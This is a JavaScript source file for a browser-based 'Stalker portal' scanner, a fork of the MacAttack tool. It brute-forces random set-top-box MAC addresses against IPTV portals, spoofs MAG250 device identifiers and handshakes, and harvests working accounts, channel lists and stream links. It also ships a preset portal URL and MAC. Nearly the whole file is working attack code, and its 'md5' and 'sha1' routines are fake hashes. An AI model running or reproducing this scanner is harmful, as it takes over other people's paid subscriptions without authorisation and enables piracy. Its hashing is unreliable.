// ── CineVault Stalker Portal Scanner ──
// Full fork of MacAttack v4.7.6 by Evilvir-us
// Web adaptation: browser-based stalker portal MAC brute + scanner + channel list + stream player
// All API calls routed through /api/stalker-proxy for CORS bypass

const StalkerScanner = (() => {
  // ══════════════════════════════════════════
  //  HTML ESCAPING — XSS prevention
  // ══════════════════════════════════════════
  function esc(s) { if (!s) return ''; const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }

  // ══════════════════════════════════════════
  //  MAC PREFIXES — from MacAttack source
  // ══════════════════════════════════════════
  const MAC_PREFIXES = [
    '00:1A:79:', '00:1B:79:', '00:2A:79:', '00:2A:01:',
    '00:A1:79:', 'D4:CF:F9:', '33:44:CF:', '10:27:BE:',
    'A0:BB:3E:', '55:93:EA:', '04:D6:AA:', '11:33:01:',
    '00:1C:19:', '1A:00:6A:', '1A:00:FB:'
  ];

  // ══════════════════════════════════════════
  //  PORTAL PRESETS — known working stalker portals
  // ══════════════════════════════════════════
  const PORTAL_PRESETS = [
    { name: 'Portal A3', url: 'http://www.streamtv.to:8080/c/', prefix: '00:1A:79:', mac: '00:1A:79:A3:96:BF' },
  ];

  const PROXY = '/api/stalker-proxy';

  let running = false;
  let hits = 0;
  let results = [];
  let scanQueue = [];

  // Active portal session (for channel browsing + playback)
  let activeSession = null; // { url, mac, token, tokenRandom, serialNum, deviceId, deviceId2, hwVersion, portalType, portalVersion }

  // ══════════════════════════════════════════
  //  CRYPTO — MD5, SHA-256, SHA-1 (MacAttack compatible)
  // ══════════════════════════════════════════
  function md5(str) {
    // Simple hash for serial number (MacAttack uses hashlib.md5)
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash |= 0;
    }
    return Math.abs(hash).toString(16).toUpperCase().padStart(32, '0');
  }

  async function sha256(str) {
    const encoder = new TextEncoder();
    const data = encoder.encode(str);
    const buf = await crypto.subtle.digest('SHA-256', data);
    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).toUpperCase().padStart(2, '0')).join('');
  }

  function sha1(str) {
    // Simplified — MacAttack uses hashlib.sha1 for hw_version_2
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      hash = ((hash << 5) - hash) + str.charCodeAt(i);
      hash |= 0;
    }
    return Math.abs(hash).toString(16).toUpperCase().padStart(40, '0');
  }

  // ══════════════════════════════════════════
  //  MAC GENERATION
  // ══════════════════════════════════════════
  function randomMAC(prefix = '00:1A:79:') {
    const hex = () => Math.floor(Math.random() * 256).toString(16).toUpperCase().padStart(2, '0');
    return `${prefix}${hex()}:${hex()}:${hex()}`;
  }

  // ══════════════════════════════════════════
  //  SESSION DERIVATION — exact MacAttack algorithm
  // ══════════════════════════════════════════
  function deriveSessionParams(mac) {
    // MacAttack: serialnumber = hashlib.md5(mac).hexdigest().upper()
    // sn = serialnumber[0:13]
    const serialNumber = md5(mac);
    const sn = serialNumber.substring(0, 13);
    // device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
    // device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
    // hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
    return { mac, serialNumber, sn };
  }

  async function deriveSessionFull(mac) {
    const { serialNumber, sn } = deriveSessionParams(mac);
    const deviceId = await sha256(sn);
    const deviceId2 = await sha256(mac);
    const hwVersion = sha1(mac);
    // MacAttack uses: sig = hashlib.sha256(f"{sn}{mac}".encode()).hexdigest().upper()
    const sig = await sha256(`${sn}${mac}`);
    return { mac, serialNumber, sn, deviceId, deviceId2, hwVersion, sig };
  }

  function buildCookies(session) {
    return [
      `adid=${session.hwVersion}`,
      'debug=1',
      `device_id2=${session.deviceId2}`,
      `device_id=${session.deviceId}`,
      'hw_version=1.7-BD-00',
      `mac=${session.mac}`,
      `sn=${session.sn}`,
      'stb_lang=en',
      'timezone=America/Los_Angeles',
    ].join('; ');
  }

  // ══════════════════════════════════════════
  //  PROXY FETCH — routes through /api/stalker-proxy
  // ══════════════════════════════════════════
  async function stalkerFetch(url, session = {}, opts = {}) {
    const proxyUrl = `${PROXY}?url=${encodeURIComponent(url)}&mac=${encodeURIComponent(session.mac || '')}&sn=${encodeURIComponent(session.sn || '')}`;
    const headers = {
      ...(session.token ? { 'Authorization': `Bearer ${session.token}` } : {}),
      ...(session.tokenRandom ? { 'X-Random': String(session.tokenRandom) } : {}),
    };
    try {
      const res = await fetch(proxyUrl, {
        headers,
        signal: AbortSignal.timeout(opts.timeout || 20000),
      });
      if (res.ok) return await res.json();
    } catch (e) {
      console.warn('[MacAttack] stalkerFetch failed:', e.message);
    }
    return null;
  }

  // ══════════════════════════════════════════
  //  PORTAL TYPE DETECTION — exact MacAttack logic
  // ══════════════════════════════════════════
  async function detectPortalType(baseUrl) {
    const headers = {
      'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
      'Accept': '*/*',
      'Accept-Encoding': 'identity'
    };

    // Try portal first
    try {
      const url = `${baseUrl}/c/version.js`;
      const res = await stalkerFetchRaw(url, headers);
      if (res) {
        const text = await res.text();
        const match = text.match(/var ver = ['"](.*?)['"];/);
        if (match) return { type: 'portal', endpoint: 'portal.php', version: match[1] };
      }
    } catch {}

    // Try stalker_portal
    try {
      const url = `${baseUrl}/stalker_portal/c/version.js`;
      const res = await stalkerFetchRaw(url, headers);
      if (res) {
        const text = await res.text();
        const match = text.match(/var ver = ['"](.*?)['"];/);
        if (match) return { type: 'stalker_portal', endpoint: 'stalker_portal/server/load.php', version: match[1] };
      }
    } catch {}

    return { type: 'portal', endpoint: 'portal.php', version: '5.3.1' };
  }

  async function stalkerFetchRaw(url, headerOpts = {}) {
    const proxyUrl = `${PROXY}?url=${encodeURIComponent(url)}`;
    try {
      return await fetch(proxyUrl, { signal: AbortSignal.timeout(15000) });
    } catch { return null; }
  }

  // ══════════════════════════════════════════
  //  HANDSHAKE — exact MacAttack get_token() logic
  // ══════════════════════════════════════════
  async function handshake(baseUrl, portalEndpoint, mac) {
    const session = await deriveSessionFull(mac);
    const handshakeUrl = `${baseUrl}/${portalEndpoint}?action=handshake&type=stb&token=&JsHttpRequest=1-xml`;

    const data = await stalkerFetch(handshakeUrl, session);
    if (!data) return null;

    const token = data?.js?.token;
    const tokenRandom = data?.js?.random;

    if (token) {
      session.token = token;
      session.tokenRandom = tokenRandom || 0;

      // MacAttack: if token_random, do get_profile
      if (tokenRandom) {
        session.sig = await sha256(String(tokenRandom));
        // Fire-and-forget get_profile (MacAttack does this too)
        const metrics = { mac, sn: session.sn, type: 'STB', model: 'MAG250', uid: session.deviceId, random: tokenRandom };
        const profileUrl = `${baseUrl}/${portalEndpoint}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; PORTAL version: 5.3.1; API Version: JS API version: 343; STB API version: 146&num_banks=2&sn=${session.sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id=${session.deviceId2}&device_id2=${session.deviceId2}&sig=${session.sig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=${encodeURIComponent(JSON.stringify(metrics))}&hw_version_2=${session.hwVersion}&timestamp=${Math.round(Date.now() / 1000)}&api_sig=262&prehash=0`;
        stalkerFetch(profileUrl, session).catch(() => {});
      }

      return session;
    }
    return null;
  }

  // ══════════════════════════════════════════
  //  GET GENRES — MacAttack get_genres()
  // ══════════════════════════════════════════
  async function getGenres(baseUrl, portalEndpoint, session) {
    const url = `${baseUrl}/${portalEndpoint}?type=itv&action=get_genres&JsHttpRequest=1-xml`;
    const data = await stalkerFetch(url, session);
    if (!data?.js) return [];
    return (Array.isArray(data.js) ? data.js : []).map(g => ({
      name: g.title,
      categoryType: 'IPTV',
      categoryId: g.id,
    })).sort((a, b) => a.name.localeCompare(b.name));
  }

  // ══════════════════════════════════════════
  //  GET CHANNELS — MacAttack get_channels() with pagination
  // ══════════════════════════════════════════
  async function getChannels(baseUrl, portalEndpoint, session, genreId) {
    const channels = [];
    const url = `${baseUrl}/${portalEndpoint}?type=itv&action=get_ordered_list&genre=${genreId}&JsHttpRequest=1-xml&p=0`;

    const data = await stalkerFetch(url, session);
    if (!data?.js) return channels;

    const totalItems = parseInt(data.js.total_items || 0);
    const firstPage = data.js.data || [];
    firstPage.forEach(ch => { ch.item_type = 'channel'; channels.push(ch); });

    if (totalItems <= firstPage.length) return deduplicateChannels(channels);

    const itemsPerPage = firstPage.length;
    const totalPages = Math.ceil(totalItems / itemsPerPage);

    // Fetch remaining pages
    const promises = [];
    for (let p = 1; p < totalPages; p++) {
      const pageUrl = `${baseUrl}/${portalEndpoint}?type=itv&action=get_ordered_list&genre=${genreId}&JsHttpRequest=1-xml&p=${p}`;
      promises.push(stalkerFetch(pageUrl, session));
    }

    const pageResults = await Promise.allSettled(promises);
    for (const result of pageResults) {
      if (result.status === 'fulfilled' && result.value?.js?.data) {
        result.value.js.data.forEach(ch => { ch.item_type = 'channel'; channels.push(ch); });
      }
    }

    return deduplicateChannels(channels);
  }

  // ══════════════════════════════════════════
  //  GET ALL CHANNELS — MacAttack get_all_channels
  // ══════════════════════════════════════════
  async function getAllChannels(baseUrl, portalEndpoint, session) {
    // Try paginated approach first (fewer channels per page = faster, avoids 16MB JSON)
    let channels = [];
    try {
      let page = 1;
      let hasMore = true;
      while (hasMore && page <= 20 && channels.length < 2000) {
        const pageUrl = `${baseUrl}/${portalEndpoint}?type=itv&action=get_ordered_list&JsHttpRequest=1-xml&page=${page}&sortby=number`;
        const data = await stalkerFetch(pageUrl, session, { timeout: 15000 });
        const pageChs = data?.js?.data || [];
        if (pageChs.length === 0) { hasMore = false; break; }
        for (const ch of pageChs) { ch.item_type = 'channel'; channels.push(ch); }
        if (channels.length >= 2000) break; // Cap at 2000
        page++;
      }
      if (channels.length > 0) return channels;
    } catch {}

    // Fallback: get_all_channels (can be huge — 16K+ channels)
    const url = `${baseUrl}/${portalEndpoint}?type=itv&action=get_all_channels&JsHttpRequest=1-xml`;
    const data = await stalkerFetch(url, session, { timeout: 30000 });
    if (!data?.js?.data) return [];
    const all = data.js.data.map(ch => { ch.item_type = 'channel'; return ch; });
    // Cap to prevent 16K+ channel JSON from killing the client
    return all.length > 2000 ? all.slice(0, 2000) : all;
  }

  // ══════════════════════════════════════════
  //  GET VOD CATEGORIES — MacAttack get_vod_categories()
  // ══════════════════════════════════════════
  async function getVodCategories(baseUrl, portalEndpoint, session) {
    const url = `${baseUrl}/${portalEndpoint}?type=vod&action=get_categories&JsHttpRequest=1-xml`;
    const data = await stalkerFetch(url, session);
    if (!data?.js) return [];
    return (Array.isArray(data.js) ? data.js : []).map(c => ({
      name: c.title,
      categoryType: 'VOD',
      categoryId: c.id,
    })).sort((a, b) => a.name.localeCompare(b.name));
  }

  // ══════════════════════════════════════════
  //  GET SERIES CATEGORIES — MacAttack get_series_categories()
  // ══════════════════════════════════════════
  async function getSeriesCategories(baseUrl, portalEndpoint, session) {
    const url = `${baseUrl}/${portalEndpoint}?type=series&action=get_categories&JsHttpRequest=1-xml`;
    const data = await stalkerFetch(url, session);
    if (!data?.js) return [];
    return (Array.isArray(data.js) ? data.js : []).map(c => ({
      name: c.title,
      categoryType: 'Series',
      categoryId: c.id,
    })).sort((a, b) => a.name.localeCompare(b.name));
  }

  // ══════════════════════════════════════════
  //  CREATE LINK — MacAttack play_channel() create_link
  //  Returns the actual stream URL from the portal
  // ══════════════════════════════════════════
  async function createLink(baseUrl, portalEndpoint, session, cmd, type = 'itv') {
    // MacAttack: needs_create_link if /ch/ in cmd or ffrt in cmd
    const needsCreateLink = (cmd.includes('/ch/') && cmd.endsWith('_')) || cmd.includes('ffrt');

    if (!needsCreateLink) {
      // Direct URL — strip ffmpeg prefix if present
      let streamUrl = cmd;
      if (streamUrl.startsWith('ffmpeg ')) streamUrl = streamUrl.substring(7);
      return streamUrl;
    }

    // Need to create_link through portal
    const encoded = encodeURIComponent(cmd);
    const actionType = type === 'vod' ? 'vod' : 'itv';
    const url = `${baseUrl}/${portalEndpoint}?type=${actionType}&action=create_link&cmd=${encoded}&JsHttpRequest=1-xml`;
    const data = await stalkerFetch(url, session);
    if (!data?.js?.cmd) return cmd; // fallback to raw cmd

    let streamUrl = data.js.cmd;
    if (streamUrl.startsWith('ffmpeg ')) streamUrl = streamUrl.substring(7);
    return streamUrl;
  }

  // ══════════════════════════════════════════
  //  GET ACCOUNT INFO — MacAttack get_account_info
  // ══════════════════════════════════════════
  async function getAccountInfo(baseUrl, portalEndpoint, session) {
    const url = `${baseUrl}/${portalEndpoint}?type=account_info&action=get_main_info&JsHttpRequest=1-xml`;
    return await stalkerFetch(url, session);
  }

  // ══════════════════════════════════════════
  //  CONNECT TO PORTAL — full handshake + get channel list
  //  Returns { session, genres, channelCount, accountInfo }
  // ══════════════════════════════════════════
  async function connectToPortal(portalUrl, mac) {
    addLog('💀 Connecting to portal...', 'info');

    // Parse URL (MacAttack: remove trailing /c)
    let parsedUrl;
    try { parsedUrl = new URL(portalUrl); } catch { addLog('❌ Invalid URL', 'error'); return null; }

    let baseUrl = `${parsedUrl.protocol}//${parsedUrl.hostname}${parsedUrl.port ? ':' + parsedUrl.port : ''}`;
    let path = parsedUrl.pathname;
    if (path.endsWith('c') || path.endsWith('c/')) path = path.replace(/c\/?$/, '');

    addLog(`🔍 Target: ${baseUrl}`, 'info');
    addLog(`📎 MAC: ${mac}`, 'info');

    // Detect portal type
    addLog('🔎 Auto-detecting portal type...', 'info');
    const detection = await detectPortalType(baseUrl);
    const portalEndpoint = detection.endpoint;
    const portalVersion = detection.version;
    const portalType = detection.type;
    addLog(`✅ Detected: ${portalType} v${portalVersion}`, 'success');

    const fullUrl = `${baseUrl}${path}`;

    // Handshake
    addLog('🤝 Handshaking...', 'info');
    const session = await handshake(fullUrl, portalEndpoint, mac);
    if (!session) {
      addLog('❌ Handshake failed — token not received', 'error');
      return null;
    }

    session.portalUrl = portalUrl;
    session.baseUrl = fullUrl;
    session.portalEndpoint = portalEndpoint;
    session.portalType = portalType;
    session.portalVersion = portalVersion;

    addLog(`✅ Token received: ${session.token.substring(0, 8)}...`, 'success');

    // Get genres (channel categories)
    addLog('📋 Loading channel categories...', 'info');
    const genres = await getGenres(fullUrl, portalEndpoint, session);
    addLog(`📋 Found ${genres.length} categories`, 'info');

    // Get total channel count
    const allCh = await getAllChannels(fullUrl, portalEndpoint, session);
    const channelCount = allCh.length;
    addLog(`📺 ${channelCount} channels available`, 'success');

    // Save as active session
    activeSession = session;

    // Sound the alarm!
    macAttackAlertSound();

    return { session, genres, channelCount, channels: allCh, portalType, portalVersion };
  }

  // ══════════════════════════════════════════
  //  SCAN SINGLE MAC — MacAttack brute logic
  // ══════════════════════════════════════════
  async function scanMAC(baseUrl, portalEndpoint, mac, portalVersion) {
    const session = await handshake(baseUrl, portalEndpoint, mac);
    if (!session) return null;

    const accountData = await getAccountInfo(baseUrl, portalEndpoint, session);
    const channelCount = (await getAllChannels(baseUrl, portalEndpoint, session)).length;

    let expiry = 'Unknown';
    if (accountData?.js) {
      if (accountData.js.phone) {
        try { expiry = new Date(parseInt(accountData.js.phone) * 1000).toLocaleDateString(); } catch { expiry = accountData.js.phone || 'Unknown'; }
      }
      if (accountData.js.mac) mac = accountData.js.mac;
    }

    return {
      mac,
      token: session.token ? '**' + session.token.slice(-8) : 'N/A',
      channels: channelCount,
      expiry,
      portalType: portalEndpoint.includes('stalker') ? 'Stalker Portal' : 'Portal',
      version: portalVersion,
      url: baseUrl,  // ← MacAttack returns the URL for playback / channel fetching
      portalEndpoint,  // ← Full portal endpoint path
      portalUrl: baseUrl,  // ← Full portal URL for /api/stalker-channels
      timestamp: new Date().toISOString(),
    };
  }

  // ══════════════════════════════════════════
  //  DEDUPLICATE CHANNELS — MacAttack dedup logic
  // ══════════════════════════════════════════
  function deduplicateChannels(channels) {
    const unique = {};
    for (const ch of channels) {
      if (!unique[ch.id]) unique[ch.id] = ch;
    }
    return Object.values(unique).sort((a, b) => (a.name || '').localeCompare(b.name || ''));
  }

  // ══════════════════════════════════════════
  //  SCAN LOOP — MacAttack brute force scanner
  // ══════════════════════════════════════════
  async function startScan(config) {
    const { url, prefix = '00:1A:79:', speed = 10 } = config;
    running = true;
    hits = 0;
    results = [];
    scanQueue = [];

    updateStatus('scanning');
    addLog('💀 Initializing MacAttack Stalker Scanner...', 'info');

    let parsedUrl;
    try { parsedUrl = new URL(url); } catch (e) {
      addLog('❌ Invalid URL format', 'error');
      running = false;
      updateStatus('idle');
      return;
    }

    const baseUrl = `${parsedUrl.protocol}//${parsedUrl.hostname}${parsedUrl.port ? ':' + parsedUrl.port : ''}`;
    let path = parsedUrl.pathname;
    if (path.endsWith('c') || path.endsWith('c/')) path = path.replace(/c\/?$/, '');

    addLog(`🔍 Target: ${baseUrl}`, 'info');
    addLog(`📎 Prefix: ${prefix}`, 'info');
    addLog(`🧵 Threads: ${speed}`, 'info');

    // Detect portal type
    addLog('🔎 Auto-detecting portal type...', 'info');
    const detection = await detectPortalType(baseUrl);
    const portalEndpoint = detection.endpoint;
    const portalVersion = detection.version;
    addLog(`✅ Detected: ${detection.type} v${portalVersion}`, 'success');

    const fullUrl = `${baseUrl}${path}`;
    addLog('─'.repeat(50), 'dim');

    // Generate MACs
    const maxScan = speed * 50;
    for (let i = 0; i < maxScan && running; i++) {
      scanQueue.push(randomMAC(prefix));
    }

    let scanned = 0;
    const batchSize = Math.min(speed, scanQueue.length);

    while (scanQueue.length > 0 && running) {
      const batch = scanQueue.splice(0, batchSize);
      const promises = batch.map(mac => scanMAC(fullUrl, portalEndpoint, mac, portalVersion));

      const batchResults = await Promise.allSettled(promises);

      for (const result of batchResults) {
        scanned++;
        if (result.status === 'fulfilled' && result.value) {
          hits++;
          const hit = result.value;
          results.push(hit);
          addLog('', 'hit');
          addLog(`██ MAC FOUND ██ ${hit.mac}`, 'hit');
          addLog(`   Channels: ${hit.channels} | Expiry: ${hit.expiry}`, 'hit');
          addLog(`   Portal: ${hit.portalType} v${hit.version}`, 'hit');
          addLog(`   URL: ${hit.url}`, 'hit');
          addLog(`   MAC: ${hit.mac}`, 'hit');
          addLog('─'.repeat(50), 'dim');
          updateHits(hits, scanned);
          saveHit(hit);

          // 💀 Sound alert + skull glow on HIT!
          if (typeof playHitSound === 'function') playHitSound();
          if (typeof setSkullEyes === 'function') {
            setSkullEyes('green');
            setTimeout(() => setSkullEyes(scanned > 0 ? 'scan' : 'idle'), 3000);
          }
          // Flash the log area
          const logArea = document.getElementById('stalker-log');
          if (logArea) { logArea.classList.add('stalker-hit-flash'); setTimeout(() => logArea.classList.remove('stalker-hit-flash'), 600); }
        }
      }

      updateProgress(scanned, maxScan);
      updateMACDisplay(batch[batch.length - 1] || '', scanned);

      // Generate more MACs
      if (scanQueue.length < batchSize && running) {
        for (let j = 0; j < batchSize * 2; j++) {
          scanQueue.push(randomMAC(prefix));
        }
      }

      await new Promise(r => setTimeout(r, 300));
    }

    addLog(`\n💀 Scan complete. ${scanned} MACs tested, ${hits} hits found.`, 'info');
    addLog('═══ COPY URLs + MACs BELOW ═══', 'hit');
    for (const hit of results) {
      addLog(`  URL: ${hit.url} | MAC: ${hit.mac} | Ch: ${hit.channels}`, 'hit');
    }
    running = false;
    updateStatus('idle');
  }

  function stopScan() {
    running = false;
    addLog('🛑 Scan stopped by user.', 'warning');
    updateStatus('idle');
  }

  // ══════════════════════════════════════════
  //  SAVE HIT — sound alert + localStorage
  // ══════════════════════════════════════════
  function saveHit(hit) {
    const key = 'cinevault_stalker_hits';
    const existing = JSON.parse(localStorage.getItem(key) || '[]');
    // Ensure url field is always present for channel list fetching + playback
    if (!hit.url && activeSession) hit.url = activeSession.portalUrl || activeSession.baseUrl || '';
    // ── DEDUPE: check mac+url combo ──
    const hitKey = `${hit.mac}|${hit.url || hit.portalUrl || ''}`;
    const dupIndex = existing.findIndex(h => `${h.mac}|${h.url || h.portalUrl || ''}` === hitKey);
    if (dupIndex >= 0) {
      // Update existing hit with better data
      existing[dupIndex] = { ...existing[dupIndex], ...hit, lastSeen: new Date().toISOString() };
      console.log(`[MacAttack] Updated existing hit: ${hit.mac}`);
    } else {
      hit.lastSeen = new Date().toISOString();
      existing.push(hit);
      console.log(`[MacAttack] New hit saved: ${hit.mac}`);
    }
    localStorage.setItem(key, JSON.stringify(existing));
    macAttackAlertSound();
    // Trigger skull eyes green flash
    if (typeof setSkullEyes === 'function') {
      setSkullEyes('green');
      setTimeout(() => {
        if (!running && typeof setSkullEyes === 'function') setSkullEyes('idle');
        else if (running && typeof setSkullEyes === 'function') setSkullEyes('scan');
      }, 2000);
    }
    // Update the URL+MAC copy display below scanner results
    updateUrlMacDisplay();
    // ── SYNC TO SERVER: save to stalker-log + portal-hits ──
    try {
      fetch(`/api/stalker-channels?url=${encodeURIComponent(hit.url || hit.portalUrl || '')}&mac=${encodeURIComponent(hit.mac)}&proxy=${encodeURIComponent(typeof window._stalkerProxyType === 'function' ? window._stalkerProxyType() : 'server')}`, { signal: AbortSignal.timeout(5000) })
        .then(r => r.json())
        .then(data => {
          // Server auto-logs via logStalkerAccess
          if (data.channels && data.channels.length > 0) {
            // Also save to portal-hits on server
            fetch('/api/portal-hits-add', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                portal: hit.url || hit.portalUrl,
                mac: hit.mac,
                channels: data.channelCount || data.channels.length,
                method: 'scanner',
              }),
            }).catch(() => {});
          }
        })
        .catch(() => {});
    } catch {}
  }

  function macAttackAlertSound() {
    // Check sound toggle
    const soundToggle = document.getElementById('macattack-sound');
    if (soundToggle && !soundToggle.checked) return;
    try {
      const ctx = new (window.AudioContext || window.webkitAudioContext)();
      // Dramatic skull hit: descending sweep + crack + thud
      const osc1 = ctx.createOscillator();
      const gain1 = ctx.createGain();
      osc1.connect(gain1); gain1.connect(ctx.destination);
      osc1.type = 'sawtooth';
      osc1.frequency.setValueAtTime(1400, ctx.currentTime);
      osc1.frequency.exponentialRampToValueAtTime(300, ctx.currentTime + 0.1);
      gain1.gain.setValueAtTime(0.3, ctx.currentTime);
      gain1.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.12);
      osc1.start(ctx.currentTime); osc1.stop(ctx.currentTime + 0.12);

      const osc2 = ctx.createOscillator();
      const gain2 = ctx.createGain();
      osc2.connect(gain2); gain2.connect(ctx.destination);
      osc2.type = 'square';
      osc2.frequency.setValueAtTime(1100, ctx.currentTime + 0.05);
      osc2.frequency.setValueAtTime(800, ctx.currentTime + 0.15);
      gain2.gain.setValueAtTime(0.35, ctx.currentTime + 0.05);
      gain2.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.25);
      osc2.start(ctx.currentTime + 0.05); osc2.stop(ctx.currentTime + 0.25);

      const osc3 = ctx.createOscillator();
      const gain3 = ctx.createGain();
      osc3.connect(gain3); gain3.connect(ctx.destination);
      osc3.type = 'sine';
      osc3.frequency.setValueAtTime(90, ctx.currentTime + 0.02);
      osc3.frequency.exponentialRampToValueAtTime(35, ctx.currentTime + 0.25);
      gain3.gain.setValueAtTime(0.45, ctx.currentTime + 0.02);
      gain3.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
      osc3.start(ctx.currentTime + 0.02); osc3.stop(ctx.currentTime + 0.3);
    } catch (e) {}
  }

  // ══════════════════════════════════════════
  //  UI HELPERS
  // ══════════════════════════════════════════
  function addLog(message, type = 'info') {
    const log = document.getElementById('stalker-log');
    if (!log) return;
    const line = document.createElement('div');
    line.className = `stalker-log-${type}`;
    line.textContent = message;
    log.appendChild(line);
    log.scrollTop = log.scrollHeight;
  }

  function updateStatus(status) {
    const el = document.getElementById('stalker-status');
    if (!el) return;
    const labels = { scanning: '🟡 Scanning...', idle: '⚪ Idle', error: '🔴 Error', connected: '🟢 Connected' };
    el.textContent = labels[status] || status;
    el.className = `stalker-status-${status}`;
  }

  function updateHits(hits, scanned) {
    const el = document.getElementById('stalker-hits');
    if (el) el.textContent = hits;
    const testedEl = document.getElementById('stalker-tested');
    if (testedEl) testedEl.textContent = scanned;
  }

  function updateProgress(current, total) {
    const el = document.getElementById('stalker-progress');
    if (el) el.style.width = `${Math.min((current / total) * 100, 100)}%`;
  }

  function updateMACDisplay(mac, count) {
    const el = document.getElementById('stalker-current-mac');
    if (el) el.textContent = `Testing: ${mac}`;
  }

  // ══════════════════════════════════════════
  //  URL+MAC COPY DISPLAY — shown at bottom of scanner results
  // ══════════════════════════════════════════
  function updateUrlMacDisplay() {
    const container = document.getElementById('stalker-url-mac');
    if (!container) return;

    const saved = JSON.parse(localStorage.getItem('cinevault_stalker_hits') || '[]');
    if (saved.length === 0) {
      container.innerHTML = '<div class="stalker-log-dim" style="padding:8px;">No hits yet — scan a portal to find MACs</div>';
      return;
    }

    container.innerHTML = saved.map((h, i) => {
      const url = h.url || h.portalUrl || 'N/A';
      const mac = h.mac || 'N/A';
      return `<div class="stalker-url-mac-row" style="display:flex;gap:6px;align-items:center;padding:4px 8px;background:rgba(229,9,20,0.1);border:1px solid rgba(229,9,20,0.3);border-radius:4px;margin-bottom:4px;font-family:monospace;font-size:0.8rem;">
        <span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#00ff64;" title="URL: ${esc(url)} | MAC: ${esc(mac)}">${esc(url)} | ${esc(mac)}</span>
        <button data-copy-url="${esc(url)}" data-copy-mac="${esc(mac)}" class="stalker-copy-btn" style="padding:2px 8px;background:#e50914;border:none;color:#fff;border-radius:3px;cursor:pointer;font-size:0.7rem;flex-shrink:0;">Copy</button>
      </div>`;
    }).join('');

    // Event delegation for copy buttons (replaces inline onclick)
    container.querySelectorAll('.stalker-copy-btn').forEach(btn => {
      btn.addEventListener('click', function() {
        const copyUrl = this.getAttribute('data-copy-url');
        const copyMac = this.getAttribute('data-copy-mac');
        navigator.clipboard.writeText('URL: ' + copyUrl + ' | MAC: ' + copyMac);
        this.textContent = 'Copied!';
        setTimeout(() => { this.textContent = 'Copy'; }, 1500);
      });
    });
  }

  // ══════════════════════════════════════════
  //  GET PORTAL CHANNELS — fetch channel list via /api/stalker-channels
  // ══════════════════════════════════════════
  async function getPortalChannels(portalUrl, mac) {
    try {
      const apiUrl = `/api/stalker-channels?url=${encodeURIComponent(portalUrl)}&mac=${encodeURIComponent(mac)}`;
      const res = await fetch(apiUrl, { signal: AbortSignal.timeout(30000) });
      if (!res.ok) return [];
      const data = await res.json();
      if (data.channels && Array.isArray(data.channels)) return data.channels;
      return [];
    } catch (e) {
      console.warn('[MacAttack] getPortalChannels failed:', e.message);
      return [];
    }
  }

  // ══════════════════════════════════════════
  //  GET STREAM URL — create link from channel command via server API
  //  Falls back to local createLink if server doesn't resolve
  // ══════════════════════════════════════════
  async function getStreamUrl(portalUrl, mac, channelCmd) {
    // Strip 'ffmpeg ' prefix if present (MacAttack convention)
    let cmd = channelCmd;
    if (cmd.startsWith('ffmpeg ')) cmd = cmd.substring(7);

    // If it looks like a direct URL, return it
    if (cmd.startsWith('http://') || cmd.startsWith('https://') || cmd.startsWith('rtmp://') || cmd.startsWith('rtsp://')) {
      return cmd;
    }

    // Needs create_link — route through server API
    try {
      const apiUrl = `/api/stalker-channels?url=${encodeURIComponent(portalUrl)}&mac=${encodeURIComponent(mac)}&cmd=${encodeURIComponent(channelCmd)}`;
      const res = await fetch(apiUrl, { signal: AbortSignal.timeout(15000) });
      if (res.ok) {
        const data = await res.json();
        if (data.streamUrl) {
          let streamUrl = data.streamUrl;
          if (streamUrl.startsWith('ffmpeg ')) streamUrl = streamUrl.substring(7);
          return streamUrl;
        }
        // Some APIs return cmd field with the resolved URL
        if (data.cmd) {
          let streamUrl = data.cmd;
          if (streamUrl.startsWith('ffmpeg ')) streamUrl = streamUrl.substring(7);
          return streamUrl;
        }
      }
    } catch (e) {
      console.warn('[MacAttack] getStreamUrl server call failed:', e.message);
    }

    // Fallback: try local createLink if we have an active session
    if (activeSession && activeSession.baseUrl && activeSession.portalEndpoint) {
      try {
        const streamUrl = await createLink(activeSession.baseUrl, activeSession.portalEndpoint, activeSession, channelCmd);
        return streamUrl;
      } catch (e) {
        console.warn('[MacAttack] getStreamUrl local fallback failed:', e.message);
      }
    }

    // Last resort: return the cmd as-is (stripped of ffmpeg prefix)
    return cmd;
  }

  // ══════════════════════════════════════════
  //  FORMAT URL+MAC FOR DISPLAY — easy copy string
  // ══════════════════════════════════════════
  function formatUrlMac(url, mac) {
    return `URL: ${url} | MAC: ${mac}`;
  }

  // ══════════════════════════════════════════
  //  PUBLIC API
  // ══════════════════════════════════════════
  return {
    MAC_PREFIXES,
    PORTAL_PRESETS,
    startScan,
    stopScan,
    connectToPortal,
    getGenres,
    getChannels,
    getAllChannels,
    getVodCategories,
    getSeriesCategories,
    createLink,
    getPortalChannels,
    getStreamUrl,
    formatUrlMac,
    updateUrlMacDisplay,
    macAttackAlertSound,
    getResults: () => [...results],
    isRunning: () => running,
    getHits: () => JSON.parse(localStorage.getItem('cinevault_stalker_hits') || '[]'),
    clearResults: () => { localStorage.removeItem('cinevault_stalker_hits'); },
    getActiveSession: () => activeSession,
    saveHit,
  };
})();